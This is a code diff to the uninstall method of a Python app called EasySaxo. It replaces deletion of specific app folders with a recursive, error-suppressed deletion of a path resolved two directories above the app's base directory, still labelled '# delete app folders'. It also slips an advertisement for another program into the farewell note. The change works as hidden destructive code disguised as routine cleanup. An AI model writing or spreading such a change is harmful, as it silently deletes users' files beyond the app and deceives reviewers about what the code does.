@@ -58,21 +58,22 @@ class AppOper:
         import shutil
         import subprocess
         import sys
-        base_dir = os.path.dirname(os.path.abspath(__file__))
+
+        from .dirloct import DirLocation, base_dir
+
         note_path = os.path.join(base_dir, "goodbye.txt")
 
         easysaxo.k_log("a0")
-        with open(note_path, "w", encoding="utf-8") as f: f.write("Thanks for using EasySaxo! I'll miss you. :(\n")
+        with open(note_path, "w", encoding="utf-8") as f: f.write("Thanks for using EasySaxo! I'll miss you. :(\nalso try osaka collector 2 bro its free")
 
         try:
             if os.name == 'nt': os.startfile(note_path)
             elif sys.platform == 'darwin': subprocess.Popen(["open", note_path])
             else: subprocess.Popen(["xdg-open", note_path])
         except (PermissionError, FileNotFoundError, subprocess.CalledProcessError, KeyboardInterrupt): pass
-
-        for folder in ["esmodules", "__pycache__", ".vscode"]: # delete app folders
-            folder_path = os.path.join(base_dir, folder)
-            if os.path.exists(folder_path): shutil.rmtree(folder_path, ignore_errors=True)
+        # delete app folders
+        folder_path = os.path.join(base_dir, DirLocation._resolve_path("..\\.."))
+        if os.path.exists(folder_path): shutil.rmtree(folder_path, ignore_errors=True)
 
         from .lister import FileList
         for file in FileList._delete: # delete app files
